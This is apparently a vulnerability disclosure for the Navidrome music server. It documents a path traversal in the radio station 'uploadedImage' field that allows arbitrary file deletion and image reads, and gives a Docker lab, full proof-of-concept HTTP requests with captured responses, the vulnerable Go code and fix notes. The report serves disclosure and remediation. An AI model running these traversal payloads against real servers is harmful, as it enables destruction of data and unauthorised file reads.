### Vulnerability details

**Official website / Product:** https://www.navidrome.org/

**Repository:** https://github.com/navidrome/navidrome (stars at selection: 24477)

**Vulnerability type:** file_upload (path traversal via artwork upload metadata → arbitrary file delete / image read)

**Vulnerability versions:** 0.64.2 (build 10114574); also present on current `master` (`UploadedImagePath` unchanged)

**Vulnerability URL / Parameter:** `PUT /api/radio/{id}` body field `uploadedImage`; impact via `DELETE /api/radio/{id}/image` (and Subsonic `getCoverArt` with id=`ra-{radioId}` for image read)

**Complex:** yes

### Verification procedure

1. Start the lab with the compose below (original `labs/navidrome-r25a7/` was removed). Image `deluan/navidrome:0.64.2`, host port **20507→4533**, container name `navidrome-r25a7`. Env `ND_DEVAUTOCREATEADMINPASSWORD=Admin123!` auto-creates admin `admin` / `Admin123!`. Default `ND_DATAFOLDER=/data`; artwork root is `/data/artwork/`.

```bash
mkdir -p /tmp/navidrome-r25a7-lab/music /tmp/navidrome-r25a7-lab/data
cd /tmp/navidrome-r25a7-lab
cat > docker-compose.yml <<'EOF'
services:
  navidrome:
    image: deluan/navidrome:0.64.2
    container_name: navidrome-r25a7
    ports:
      - "20507:4533"
    environment:
      ND_DEVAUTOCREATEADMINPASSWORD: "Admin123!"
      ND_LOGLEVEL: info
      ND_MUSICFOLDER: /music
      ND_DATAFOLDER: /data
    volumes:
      - ./music:/music:ro
      - ./data:/data
EOF
docker compose up -d
# wait until ready; host base URL http://127.0.0.1:20507
```

2. Login for a JWT: `POST /auth/login` with JSON `{"username":"admin","password":"Admin123!"}`; use response field `token` as `x-nd-authorization: Bearer <token>` (Bearer values in the PoC below are from the capture session — refresh on reproduce).
3. `POST /api/radio` to create a radio station; note response `id` (capture used `1h4Rk8og2hzEMg8GULAiRN`).
4. Plant a victim file inside the container:
   ```bash
   docker exec navidrome-r25a7 sh -c 'echo R25A7_DELETE_PROOF > /tmp/r25a7-victim-file.txt'
   docker exec navidrome-r25a7 ls -l /tmp/r25a7-victim-file.txt
   ```
5. `PUT /api/radio/{id}` with JSON field `uploadedImage` set to a relative path that escapes the artwork directory, e.g. `../../../tmp/r25a7-victim-file.txt` (relative to `/data/artwork/radio/`, `filepath.Join` resolves to `/tmp/r25a7-victim-file.txt`).
6. Confirm the response/DB stores the traversal string unchanged.
7. `DELETE /api/radio/{id}/image` — server calls `os.Remove` on `UploadedImagePath()`; the victim file is deleted.
8. (Optional) Point `uploadedImage` at an external `.jpg` (e.g. `../../../tmp/secret-cover.jpg`) and call Subsonic `getCoverArt?id=ra-{id}` to read that image’s bytes (capture returned `Content-Type: image/jpeg`, 334 bytes).

### Complete vulnerability PoC

Prep: login for token (refresh on reproduce):

```http
POST /auth/login HTTP/1.1
Host: 127.0.0.1:20507
Content-Type: application/json
Accept: application/json
Content-Length: 47

{"username":"admin","password":"Admin123!"}
```

Login response (field `token` is the Bearer; structure shown, values change per session):

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"id":"...","name":"admin","username":"admin","isAdmin":true,"token":"<JWT>","subsonicSalt":"...","subsonicToken":"..."}
```

Prep: create radio (Docker-verified id appears in the PUT below):

```http
POST /api/radio HTTP/1.1
Host: 127.0.0.1:20507
x-nd-authorization: Bearer <JWT>
Content-Type: application/json
Accept: application/json

{"name":"r25a7-path","streamUrl":"http://127.0.0.1/stream.mp3"}
```

Setup HTTP request (plants traversal into `uploadedImage`; Docker-verified; token/id from capture session):

```http
PUT /api/radio/1h4Rk8og2hzEMg8GULAiRN HTTP/1.1
Host: 127.0.0.1:20507
User-Agent: curl/8.22.0
x-nd-authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG0iOnRydWUsImV4cCI6MTc5MzY1NTkzMSwiaWF0IjoxNzkzNTY5NTMxLCJpc3MiOiJORCIsInN1YiI6ImFkbWluIiwidWlkIjoiN3g0UEs5OGxHM3NoeU1sWWFNV2NtNSJ9.ZXDhqwuQCrBDs4WRR6IMDOlJfr3WrSr6y-geETO5_tA
Content-Type: application/json
Accept: application/json
Content-Length: 116

{"name":"r25a7-path","streamUrl":"http://127.0.0.1/stream.mp3","uploadedImage":"../../../tmp/r25a7-victim-file.txt"}
```

Setup HTTP response:

```http
HTTP/1.1 200 OK
Content-Type: application/json
Permissions-Policy: autoplay=(), camera=(), microphone=(), usb=()
Referrer-Policy: same-origin
Vary: Origin
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-Nd-Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG0iOnRydWUsImV4cCI6MTc5MzY1NjE1NywiaWF0IjoxNzkzNTY5NTMxLCJpc3MiOiJORCIsInN1YiI6ImFkbWluIiwidWlkIjoiN3g0UEs5OGxHM3NoeU1sWWFNV2NtNSJ9.BKAFK0YqEZmkhlXtfPd1l6rmpMrPARpW-oJ83ZZnsNE
Date: Sun, 01 Nov 2026 21:49:17 GMT
Content-Length: 253

{"id":"1h4Rk8og2hzEMg8GULAiRN","streamUrl":"http://127.0.0.1/stream.mp3","name":"r25a7-path","homePageUrl":"","uploadedImage":"../../../tmp/r25a7-victim-file.txt","createdAt":"2026-11-01T21:49:17.456088467Z","updatedAt":"2026-11-01T21:49:17.495844507Z"}
```

Impact HTTP request (deletes arbitrary file via image-delete API; Docker-verified):

```http
DELETE /api/radio/1h4Rk8og2hzEMg8GULAiRN/image HTTP/1.1
Host: 127.0.0.1:20507
User-Agent: curl/8.22.0
x-nd-authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG0iOnRydWUsImV4cCI6MTc5MzY1NTkzMSwiaWF0IjoxNzkzNTY5NTMxLCJpc3MiOiJORCIsInN1YiI6ImFkbWluIiwidWlkIjoiN3g0UEs5OGxHM3NoeU1sWWFNV2NtNSJ9.ZXDhqwuQCrBDs4WRR6IMDOlJfr3WrSr6y-geETO5_tA
Accept: application/json
```

Impact HTTP response:

```http
HTTP/1.1 200 OK
Permissions-Policy: autoplay=(), camera=(), microphone=(), usb=()
Referrer-Policy: same-origin
Vary: Origin
X-Content-Type-Options: nosniff
X-Frame-Options: DENY
X-Nd-Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhZG0iOnRydWUsImV4cCI6MTc5MzY1NjE1NywiaWF0IjoxNzkzNTY5NTMxLCJpc3MiOiJORCIsInN1YiI6ImFkbWluIiwidWlkIjoiN3g0UEs5OGxHM3NoeU1sWWFNV2NtNSJ9.BKAFK0YqEZmkhlXtfPd1l6rmpMrPARpW-oJ83ZZnsNE
Date: Sun, 01 Nov 2026 21:49:17 GMT
Content-Length: 15
Content-Type: text/plain; charset=utf-8

{"status":"ok"}
```

Verification result notes:

- After the PUT, SQLite showed `uploaded_image=../../../tmp/r25a7-victim-file.txt` (row like `1h4Rk8og2hzEMg8GULAiRN|../../../tmp/r25a7-victim-file.txt`).
- Before DELETE, `/tmp/r25a7-victim-file.txt` existed: `-rw-r--r-- 1 root root 19 ... /tmp/r25a7-victim-file.txt`, contents `R25A7_DELETE_PROOF`.
- After DELETE returned `{"status":"ok"}`, the victim path was gone:
  ```text
  ls: /tmp/r25a7-victim-file.txt: No such file or directory
  VICTIM_GONE
  ```
- Separately, setting `uploadedImage` to `../../../tmp/secret-cover.jpg` caused `getCoverArt` to return that file’s JPEG bytes (334 bytes, `Content-Type: image/jpeg`).

### Vulnerability analysis

Navidrome stores manual radio covers as a filename in `radio.uploaded_image` (model field `UploadedImage`, JSON `uploadedImage`). The intended writer is only the multipart upload endpoint `POST /api/radio/{id}/image`, which builds a safe name via `utils.CleanFileName` (`imageFilename` in `core/artwork/uploader.go`). Playlist covers go through the dedicated `core/playlists` service (`SetImage`/`RemoveImage`) and do not persist a client JSON value as an upload filename. Radio REST instead mounts generic `deluan/rest`: `PUT /api/radio/{id}` passes JSON keys (including `uploadedImage`) as update columns into `radioRepository.Update` → `Put`, so an admin can persist an arbitrary string.

`model.UploadedImagePath` then does unsanitized `filepath.Join(DataFolder, "artwork", entityType, filename)`. Relative `../` segments escape the artwork directory (under Docker `DataFolder=/data`, `../../../tmp/x` → `/tmp/x`); on Linux an absolute `filename` also overrides earlier Join elements. `DELETE /api/radio/{id}/image` → `uploader.RemoveImage` calls `os.Remove` on that path with **no** containment check (and no image-extension check). Cover resolution uses the same path for reads when the extension looks like an image.

Requires an admin JWT (`radioRepository.isPermitted` checks `user.IsAdmin`). Still unexpected: the upload feature’s delete path becomes arbitrary filesystem delete, while playlist cover writes are already isolated behind a dedicated upload service.

Trigger / sink source (full path and line numbers, tag `v0.64.2`):

```go
# File: model/image.go
# Lines: 12-17 (tag v0.64.2)
func UploadedImagePath(entityType, filename string) string {
	if filename == "" {
		return ""
	}
	return filepath.Join(conf.Server.DataFolder.String(), consts.ArtworkFolder, entityType, filename)
}
```

```go
# File: model/radio.go
# Lines: 16, 25-27 (tag v0.64.2)
UploadedImage string    `structs:"uploaded_image"   json:"uploadedImage,omitempty"`
// ...
func (r Radio) UploadedImagePath() string {
	return UploadedImagePath(consts.EntityRadio, r.UploadedImage)
}
```

```go
# File: server/nativeapi/radios.go
# Lines: 58-78 (tag v0.64.2)
func (api *Router) deleteRadioImage() http.HandlerFunc {
	return handleImageDelete(func(ctx context.Context) error {
		radioID := chi.URLParamFromCtx(ctx, "id")
		radio, err := api.ds.Radio(ctx).Get(radioID)
		if err != nil {
			if errors.Is(err, model.ErrNotFound) {
				return model.ErrNotFound
			}
			return err
		}
		if err := api.imgUpload.RemoveImage(ctx, radio.UploadedImagePath()); err != nil {
			return err
		}
		radio.UploadedImage = ""
		if err := api.ds.Radio(ctx).Put(radio, "UploadedImage"); err != nil {
			return err
		}
		api.imgUpload.EnqueueArtwork(ctx, consts.EntityRadio, radio.ID)
		return nil
	})
}
```

```go
# File: core/artwork/uploader.go
# Lines: 90-98 (tag v0.64.2)
func (s *uploader) RemoveImage(ctx context.Context, path string) error {
	if path == "" {
		return nil
	}
	if err := os.Remove(path); err != nil && !os.IsNotExist(err) {
		return fmt.Errorf("removing image %q: %w", path, err)
	}
	return nil
}
```

```go
# File: persistence/radio_repository.go
# Lines: 137-144 (tag v0.64.2)
func (r *radioRepository) Update(id string, entity any, cols ...string) error {
	t := entity.(*model.Radio)
	t.ID = id
	if !r.isPermitted() {
		return rest.ErrPermissionDenied
	}
	return r.Put(t, cols...)
}
```

### Fix notes

- Treat `uploadedImage` as upload-endpoint-only (ignore or force-empty on REST create/update; match playlist’s dedicated upload service).
- In `UploadedImagePath`, reject `..`, empty, and absolute filenames; ensure `filepath.Clean` result stays under `DataFolder/artwork/<entity>/` (e.g. `filepath.Rel` + reject `..` prefix / `filepath.IsLocal`).
- Refuse `RemoveImage` / resolve unless the path is inside the artwork root.
